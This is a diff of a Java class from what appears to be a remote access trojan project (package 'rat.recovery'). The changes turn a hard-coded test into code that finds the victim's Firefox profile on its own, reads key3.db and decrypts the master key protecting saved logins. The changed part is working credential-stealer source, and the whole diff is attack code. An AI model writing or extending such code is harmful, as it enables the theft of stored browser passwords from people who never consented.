@@ -1,14 +1,22 @@
 package de.sogomn.rat.recovery;
 
+import java.io.File;
+import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.Arrays;
+import java.util.Optional;
+import java.util.stream.Stream;
 
+import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.Mac;
+import javax.crypto.NoSuchPaddingException;
 import javax.crypto.spec.IvParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
+import javax.swing.JOptionPane;
 
 import de.sogomn.engine.util.FileUtils;
 
@@ -18,14 +26,18 @@ import de.sogomn.engine.util.FileUtils;
 public final class Firefox {
 	
 	private static final byte[] GLOBAL_SALT_KEY = "global-salt".getBytes();
-	private static final byte[] PASSWORD_CHECK_KEY = "password-check".getBytes();
-	private static final byte[] PRIVATE_KEY_KEY = {(byte)0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
 	private static final int GLOBAL_SALT_LENGTH = 20;
-	private static final int PASSWORD_CHECK_LENGTH = 16;
-	private static final int PRIVATE_KEY_LENGTH = 143;
-	private static final int ENTRY_SALT_LENGTH = 20;
+	private static final byte[] PRIVATE_KEY_KEY = {(byte)0xF8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01};
+	private static final int PRIVATE_KEY_ENTRY_SALT_LENGTH = 20;
+	private static final int PRIVATE_KEY_ENTRY_SALT_OFFSET = 121;
+	private static final int PADDED_ENTRY_SALT_LENGTH = 20;
 	private static final int TRIPLE_DES_KEY_LENGTH = 24;
 	private static final int INITIALIZING_VECTOR_LENGTH = 8;
+	private static final int FINAL_TRIPLE_DES_DECRYPTION_KEY_LENGTH = 24;
+	private static final int FINAL_TRIPLE_DES_DECRYPTION_KEY_OFFSET = 51;
+	
+	private static final byte[] PASSWORD_CHECK_KEY = "password-check".getBytes();
+	private static final int PASSWORD_CHECK_LENGTH = 16;
 	
 	private Firefox() {
 		//...
@@ -141,9 +153,23 @@ public final class Firefox {
 		return null;
 	}
 	
+	private static byte[] getPrivateKeyEntrySalt(final byte[] data) {
+		final int privateKeyIndex = indexOf(data, PRIVATE_KEY_KEY);
+		final int from = privateKeyIndex - PRIVATE_KEY_ENTRY_SALT_OFFSET;
+		final int to = from + PRIVATE_KEY_ENTRY_SALT_LENGTH;
+		
+		if (to != -1 && from > 0) {
+			final byte[] privateKeyEntrySalt = Arrays.copyOfRange(data, from, to);
+			
+			return privateKeyEntrySalt;
+		}
+		
+		return null;
+	}
+	
 	private static byte[] getPrivateKey(final byte[] data) {
 		final int to = indexOf(data, PRIVATE_KEY_KEY);
-		final int from = to - PRIVATE_KEY_LENGTH;
+		final int from = to - PRIVATE_KEY_ENTRY_SALT_OFFSET + PRIVATE_KEY_ENTRY_SALT_LENGTH + 3 + 2;
 		
 		if (to != -1 && from > 0) {
 			final byte[] privateKey = Arrays.copyOfRange(data, from, to);
@@ -154,22 +180,16 @@ public final class Firefox {
 		return null;
 	}
 	
-	private static byte[] decryptTripleDesCbc(final byte[] data, final byte[] key, final byte[] initializingVector) {
-		try {
-			final SecretKeySpec secretKeySpec = new SecretKeySpec(key, "DESede");
-			final IvParameterSpec initializingVectorSpec = new IvParameterSpec(initializingVector);
-			final Cipher cipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
-			
-			cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, initializingVectorSpec);
-			
-			final byte[] decrypted = cipher.doFinal(data);
-			
-			return decrypted;
-		} catch (final Exception ex) {
-			ex.printStackTrace();
-			
-			return null;
-		}
+	private static byte[] decryptTripleDesCbc(final byte[] input, final byte[] key, final byte[] initializingVector) throws InvalidKeyException, InvalidAlgorithmParameterException, NoSuchAlgorithmException, NoSuchPaddingException, IllegalBlockSizeException, BadPaddingException {
+		final SecretKeySpec secretKeySpec = new SecretKeySpec(key, "DESede");
+		final IvParameterSpec initializingVectorSpec = new IvParameterSpec(initializingVector);
+		final Cipher cipher = Cipher.getInstance("DESede/CBC/PKCS5Padding");
+		
+		cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, initializingVectorSpec);
+		
+		final byte[] decrypted = cipher.doFinal(input);
+		
+		return decrypted;
 	}
 	
 	private static byte[] getKey(final byte[] globalSalt, final byte[] entrySalt, final byte[] masterPassword) throws NoSuchAlgorithmException, InvalidKeyException {
@@ -186,7 +206,7 @@ public final class Firefox {
 		final byte[] combinedHashedPassword = sha1.digest();
 		final Mac mac = Mac.getInstance("HmacSHA1");
 		final SecretKeySpec macKey = new SecretKeySpec(combinedHashedPassword, "HmacSHA1");
-		final byte[] paddedEntrySalt = Arrays.copyOf(entrySalt, ENTRY_SALT_LENGTH);
+		final byte[] paddedEntrySalt = Arrays.copyOf(entrySalt, PADDED_ENTRY_SALT_LENGTH);
 		
 		mac.init(macKey);
 		mac.update(paddedEntrySalt);
@@ -204,35 +224,54 @@ public final class Firefox {
 		return key;
 	}
 	
-	/*
-	 * TODO: Method to decrypt, entry-salt as parameter
-	 */
-	
 	public static void main(final String[] args) {
-		final byte[] data = FileUtils.readExternalData("C:/Users/Sogomn/AppData/Roaming/Mozilla/Firefox/Profiles/iluy5ufi.default/key3.db");
+		final File file = new File(System.getenv("APPDATA") + File.separator + "Mozilla/Firefox/Profiles");
+		final File[] children = file.listFiles();
+		
+		if (children == null) {
+			return;
+		}
+		
+		final Optional<File> first = Stream.of(children).findFirst();
+		
+		if (!first.isPresent()) {
+			return;
+		}
+		
+		final File profile = first.get();
+		final String path = profile.getAbsolutePath() + File.separator + "key3.db";
+		
+		final byte[] data = FileUtils.readExternalData(path);
+		final byte[] masterPassword = "".getBytes();
 		final byte[] globalSalt = getGlobalSalt(data);
+		final byte[] privateKeyEntrySalt = getPrivateKeyEntrySalt(data);
 		final byte[] privateKey = getPrivateKey(data);
 		final byte[] passwordCheckEntrySalt = getPasswordCheckEntrySalt(data);
 		final byte[] passwordCheck = getPasswordCheck(data);
-		final byte[] masterPassword = "testpass".getBytes();
 		
 		try {
-			final byte[] key = getKey(globalSalt, passwordCheckEntrySalt, masterPassword);
-			final byte[] tripleDesKey = Arrays.copyOf(key, TRIPLE_DES_KEY_LENGTH);
-			final byte[] initializingVector = Arrays.copyOfRange(key, key.length - INITIALIZING_VECTOR_LENGTH, key.length);
+			final byte[] passwordCheckKey = getKey(globalSalt, passwordCheckEntrySalt, masterPassword);
+			final byte[] passwordCheckTripleDesKey = Arrays.copyOf(passwordCheckKey, TRIPLE_DES_KEY_LENGTH);
+			final byte[] passwordCheckInitializingVector = Arrays.copyOfRange(passwordCheckKey, passwordCheckKey.length - INITIALIZING_VECTOR_LENGTH, passwordCheckKey.length);
+			final byte[] passwordCheckClearText = decryptTripleDesCbc(passwordCheck, passwordCheckTripleDesKey, passwordCheckInitializingVector);
+			final boolean valid = Arrays.equals(PASSWORD_CHECK_KEY, passwordCheckClearText);
 			
-			final String test0 = toHex(passwordCheck);
-			final String test1 = toHex(tripleDesKey);
-			final String test2 = toHex(initializingVector);
+			if (!valid) {
+				System.err.println("Invalid master password!");
+				
+				return;
+			}
 			
-			System.out.println("Cipher: " + test0);
-			System.out.println("3DES key: " + test1);
-			System.out.println("Initializing vector: " + test2);
+			final byte[] privateDecryptionKey = getKey(globalSalt, privateKeyEntrySalt, masterPassword);
+			final byte[] privateDecryptionKeyTripleDesKey = Arrays.copyOf(privateDecryptionKey, TRIPLE_DES_KEY_LENGTH);
+			final byte[] privateDecryptionKeyInitializingVector = Arrays.copyOfRange(privateDecryptionKey, privateDecryptionKey.length - INITIALIZING_VECTOR_LENGTH, privateDecryptionKey.length);
+			final byte[] decryptionKey = decryptTripleDesCbc(privateKey, privateDecryptionKeyTripleDesKey, privateDecryptionKeyInitializingVector);
+			final byte[] finalDecryptionTripleDesKey = Arrays.copyOfRange(decryptionKey, FINAL_TRIPLE_DES_DECRYPTION_KEY_OFFSET, FINAL_TRIPLE_DES_DECRYPTION_KEY_OFFSET + FINAL_TRIPLE_DES_DECRYPTION_KEY_LENGTH);
 			
-			final byte[] test = decryptTripleDesCbc(passwordCheck, tripleDesKey, initializingVector);
+			System.out.println(toHex(finalDecryptionTripleDesKey));
 			
-			System.out.println(new String(test));
-		} catch (final InvalidKeyException | NoSuchAlgorithmException ex) {
+			JOptionPane.showMessageDialog(null, "WORKS!!!");
+		} catch (final Exception ex) {
 			ex.printStackTrace();
 		}
 	}
